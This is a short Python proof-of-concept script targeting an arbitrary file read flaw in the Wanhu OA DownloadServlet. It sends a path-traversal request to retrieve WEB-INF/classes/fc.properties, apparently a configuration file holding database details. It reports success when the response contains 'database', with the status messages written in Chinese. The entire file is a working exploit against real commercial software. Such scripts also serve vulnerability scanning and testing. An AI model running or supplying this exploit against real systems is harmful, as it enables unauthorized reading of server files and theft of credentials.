import time
import requests
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        }
    exp_url = target_url+"defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
    success_msg = now_time() + '[SUCCESS]万户OA DownloadServlet 任意文件读取漏洞存在'
    warning_msg = now_time() + '[WARNING]万户OA DownloadServlet 任意文件读取漏洞不存在'
    error_msg = now_time() + '[万户OA DownloadServlet 任意文件读取漏洞][ERROR]无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(exp_url, headers=headers, verify=False)
        shell_msg = now_time() + '{}'.format(exp_url)
        if respones.status_code == 200 and 'database' in respones.text:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
   
